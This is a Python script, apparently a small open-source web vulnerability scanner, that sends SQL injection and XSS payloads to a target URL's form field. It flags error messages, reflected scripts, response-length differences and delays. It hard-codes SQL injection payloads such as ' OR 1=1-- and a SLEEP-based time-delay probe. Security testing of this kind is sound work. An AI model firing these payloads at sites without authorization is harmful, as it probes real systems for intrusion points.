import requests
from bs4 import BeautifulSoup
import argparse
import time

def print_banner():
    print(r'''
    ____   ____    .__             _________                                         
    \   \ /   /_ __|  |   ____    /   _____/ ____ _____    ____   ____   ___________ 
     \   Y   /  |  \  |  /    \   \_____  \_/ ___\\__  \  /    \ /    \_/ __ \_  __ \\
      \     /|  |  /  |_|   |  \  /        \  \___ / __ \|   |  \   |  \  ___/|  | \/ 
       \___/ |____/|____/___|  / /_______  /\___  >____  /___|  /___|  /\___  >__|    
                            \/          \/     \/     \/     \/     \/     \/         
                                                            github.com/abhipnair
    ''')

def init_payloads(filename, payload_list):
    with open(filename, 'r') as payload_file:
        for payload in payload_file:
            payload_list.append(payload.strip())

def scan_sql_vuln(payloads, field_name, url):
    vulns_result = []
    for payload in payloads:
        data = {field_name: payload}
        response = requests.post(url, data=data)
        if "SQL syntax" in response.text or "database error" in response.text:
            vulns_result.append([payload, "Potential Error-Based SQL Injection detected."])
    return vulns_result

def scan_xss_vuln(payloads, field_name, url):
    results = []
    for payload in payloads:
        data = {field_name: payload}
        response = requests.post(url, data=data)
        if payload in response.text:
            if "<script>" in response.text or "onload=" in response.text:
                results.append([payload, "Potential XSS vulnerability detected."])
            else:
                results.append([payload, "Payload reflected, but no script execution detected."])
    return results

def scan_blind_sqli(field_name, url):
    print("[*] Scanning for Blind SQL Injection vulnerabilities...")
    TRUE_PAYLOAD = "' OR 1=1--"
    FALSE_PAYLOAD = "' OR 1=2--"

    true_data = {field_name: TRUE_PAYLOAD}
    false_data = {field_name: FALSE_PAYLOAD}

    true_response = requests.post(url, data=true_data)
    false_response = requests.post(url, data=false_data)

    if len(true_response.text) != len(false_response.text):
        print(f"[+] Potential Boolean-Based Blind SQLi detected!")
    else:
        print("[-] No obvious Blind SQLi behavior detected.")

def scan_time_based_sqli(field_name, url):
    print("[*] Scanning for Time-Based Blind SQL Injection vulnerabilities...")
    SLEEP_PAYLOAD = "' OR IF(1=1, SLEEP(5), 0)--+"

    data = {field_name: SLEEP_PAYLOAD}
    start_time = time.time()
    response = requests.post(url, data=data)
    end_time = time.time()

    duration = end_time - start_time

    if duration > 4.5:
        print(f"[+] Potential Time-Based Blind SQLi detected! (Response delay: {duration:.2f} seconds)")
    else:
        print("[-] No significant delay detected.")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="A simple vulnerability Scanner")
    parser.add_argument("-ps", "--path_sql", type=str, help="Path to your SQL payloads file", default='sql_payloads.txt')
    parser.add_argument("-px", "--path_xss", type=str, help="Path to your XSS payloads file", default='xss_payloads.txt')
    parser.add_argument("-u", "--url", type=str, help="URL of the target website", required=True)
    parser.add_argument("-f", "--field", type=str, help="Input field to perform the test", required=True)
    parser.add_argument("-t", "--type", type=str, choices=['sql', 'xss', 'both'], default='both',
                        help="Type of vulnerability to scan for: 'sql', 'xss', or 'both'")

    args = parser.parse_args()

    print_banner()

    SQL_PAYLOADS = []
    XSS_PAYLOADS = []

    if args.type in ['sql', 'both']:
        init_payloads(args.path_sql, SQL_PAYLOADS)
    if args.type in ['xss', 'both']:
        init_payloads(args.path_xss, XSS_PAYLOADS)

    if args.type in ['sql', 'both']:
        print("[*] Scanning for SQL Injection vulnerabilities...")
        sql_results = scan_sql_vuln(SQL_PAYLOADS, args.field, args.url)
        for result in sql_results:
            print(f"Payload: {result[0]} - {result[1]}")

        scan_blind_sqli(args.field, args.url)
        scan_time_based_sqli(args.field, args.url)

    if args.type in ['xss', 'both']:
        print("[*] Scanning for XSS vulnerabilities...")
        xss_results = scan_xss_vuln(XSS_PAYLOADS, args.field, args.url)
        for result in xss_results:
            print(f"Payload: {result[0]} - {result[1]}")

    print("[*] Scanning completed.")
